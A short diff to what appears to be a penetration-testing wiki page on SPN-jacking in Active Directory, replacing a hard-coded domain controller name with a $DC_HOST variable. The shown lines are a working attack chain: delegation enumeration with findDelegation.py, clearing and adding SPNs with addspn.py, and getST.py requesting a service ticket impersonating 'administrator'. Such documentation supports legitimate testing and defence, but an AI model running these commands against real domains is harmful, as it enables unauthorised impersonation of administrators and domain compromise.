@@ -39,10 +39,10 @@ From UNIX-like machines, [krbrelayx](https://github.com/dirkjanm/krbrelayx)'s [a
 findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"
 
 # 2. remove SPN from ServerB if required (live SPN-jacking)
-addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
+addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 
 # 3. add SPN to serverC
-addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
+addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 
 # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
 getST.py -spn "cifs/serverB" -impersonate "administrator" "$DOMAIN/serverA$:$PASSWORD" -altservice "cifs/serverC"
